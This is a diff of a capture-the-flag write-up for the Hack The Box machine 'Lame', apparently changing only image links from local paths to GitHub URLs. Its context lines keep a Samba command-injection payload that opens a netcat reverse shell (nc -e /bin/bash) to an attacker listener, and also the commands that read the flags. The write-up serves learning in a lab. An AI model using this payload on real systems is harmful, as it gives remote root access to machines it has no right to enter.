@@ -1,5 +1,5 @@
 # <center>Lame</center>
-<p align='center'><img src="../.medias/lame/lame_logo.png"></p>
+<p align='center'><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/lame/lame_logo.png"></p>
 
 Okay friends, today we will solve an easy labeled linux based HTB machine `Lame`.
 
@@ -73,7 +73,7 @@ I would always keep ssh on the bottom of my list to enumerate because generally 
 
 We have anonymous login enabled. Let's check it:
 
-![ftp anonymous login](../.medias/lame/ftp_anon.png)
+![ftp anonymous login](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/lame/ftp_anon.png)
 
 Argh!, useless. No interesting information here.
 
@@ -399,13 +399,13 @@ So basically on Linux, \` \` are used to execute and put the output in place, ju
 - `logon "./='nohop nc -e /bin/bash <ip_addr> <port>`
 
  I fired up my netcat listener on 1234 port and tried this payload.
- ![smb exploit](../.medias/lame/smb_exploit.png)
+ ![smb exploit](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/lame/smb_exploit.png)
 
  I got shell with root access on my netcat listener. We can go to the users home directory and grab the user flag by using the following command: `cat /home/markis/user.txt`
- ![user flag](../.medias/lame/user_flag.png)
+ ![user flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/lame/user_flag.png)
 
  Similarly, we can grab the root flag using the following command: `cat /root/root.txt`
-![root flag](../.medias/lame/root_flag.png)
+![root flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/lame/root_flag.png)
 
 Ans Voilà, we pwned lame.
 Hope you guys enjoyed reading this and learned something new.
@@ -414,4 +414,4 @@ Keep Hacking..
 
 Until we meet again...
 
-![lame pwned](../.medias/lame/lame_pwned.png)
+![lame pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/lame/lame_pwned.png)
